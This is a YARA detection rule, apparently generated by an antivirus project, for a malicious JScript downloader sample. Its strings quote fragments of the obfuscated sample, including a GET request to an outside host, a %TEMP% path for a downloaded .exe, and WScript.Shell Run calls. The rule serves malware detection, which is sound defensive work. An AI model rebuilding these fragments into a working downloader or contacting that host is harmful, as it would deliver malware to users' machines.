rule sig_20160328_8f7c035082a1914799efaa1681fa2d67 {
  meta:
    description = "datamaliciousorder - file 20160328_8f7c035082a1914799efaa1681fa2d67.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9ae4e092d9a6dab3ee4f6619dd5c87910ad5f9e4f76bb69647857f8af0f3e90b"

  strings:
    $x1  = "function Eijxya() {return Kwbigpvi[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Op0cLrCEgAe.exe\";};" fullword ascii
    $s2  = "Rkhap[Mymlezbeqb](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Eczfw](Tieolj() * 11)} while (Rkhap[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Frtye(Oaejx, Tipapkwhrb){return Oaejx - Tipapkwhrb;};" fullword ascii
    $s5  = "var Kwbigpvi = function Jvbykoedin() {return WScript[Oblmes](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Vtzstgsq() {return ((Zpgpha == true) && (Zpgpha == Kwzndeif)) ? 1 : Ztziku;};" fullword ascii
    $s7  = "function Dktjqwpoin(Mntcqr){Kwbigpvi[\"Run\"](Mntcqr, Ztziku, Ztziku);};" fullword ascii
    $s8  = "function Aqtiixv(){return Oblmes;};" fullword ascii
    $s9  = "Zpgpha = true; " fullword ascii
    $s10 = "function Wwcmnrpco(){return Wzpvffwgb;};" fullword ascii
    $s11 = "var Zpgpha = false;" fullword ascii
    $s12 = "return Frtye(Grjotl, Qfenactlzk);" fullword ascii
    $s13 = "function Tieolj(){return 22;};" fullword ascii
    $s14 = "Kwzndeif = true; " fullword ascii
    $s15 = "function Botype(Bnjttpbvc) {var Mpocvtnow = (1, 2, 3, 4, 5, Bnjttpbvc); return Mpocvtnow;};" fullword ascii
    $s16 = " while (Duzea){" fullword ascii
    $s17 = "function Cbotw()" fullword ascii
    $s18 = "var Mmussxde = false;" fullword ascii
    $s19 = "var Kwzndeif = false;" fullword ascii
    $s20 = "var Okqkcat = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    1 of ($x*) and 4 of them
}